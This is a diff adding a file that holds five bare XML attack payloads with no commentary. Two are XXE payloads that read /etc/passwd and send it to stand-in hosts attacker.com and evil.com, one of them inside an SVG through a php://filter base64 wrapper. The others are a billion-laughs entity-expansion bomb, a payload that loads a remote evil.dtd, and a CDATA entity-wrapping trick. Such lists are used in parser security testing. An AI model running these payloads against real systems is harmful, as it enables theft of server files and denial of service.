@@ -1,0 +1,61 @@
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY % payload "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?%xxe;'>">
+  %payload;
+]>
+<root>&exfil;</root>
+```
+
+```xml
+<!DOCTYPE bomb [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+]>
+<bomb>&lol5;</bomb>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ELEMENT root ANY>
+  <!ATTLIST root
+    xmlns:xsi CDATA #IMPLIED
+    xsi:schemaLocation CDATA #IMPLIED
+  >
+  <!ENTITY % dtd SYSTEM "http://127.0.0.1:8080/evil.dtd">
+  %dtd;
+]>
+<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://127.0.0.1:8080/evil.xsd">
+  <payload>&external;</payload>
+</root>
+```
+
+```xml
+<!DOCTYPE svg [
+  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://evil.com/?data=%file;'>">
+  %eval;
+]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <text>&exfiltrate;</text>
+</svg>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE html [
+  <!ENTITY % start "<![CDATA[">
+  <!ENTITY % data "CONFIDENTIAL_DATA_HERE_12345">
+  <!ENTITY % end "]]>">
+  <!ENTITY % include "<!ENTITY &#x25; all '%start;%data;%end;'>">
+  %include;
+]>
+<html>
+  <body>&all;</body>
+</html>
+```
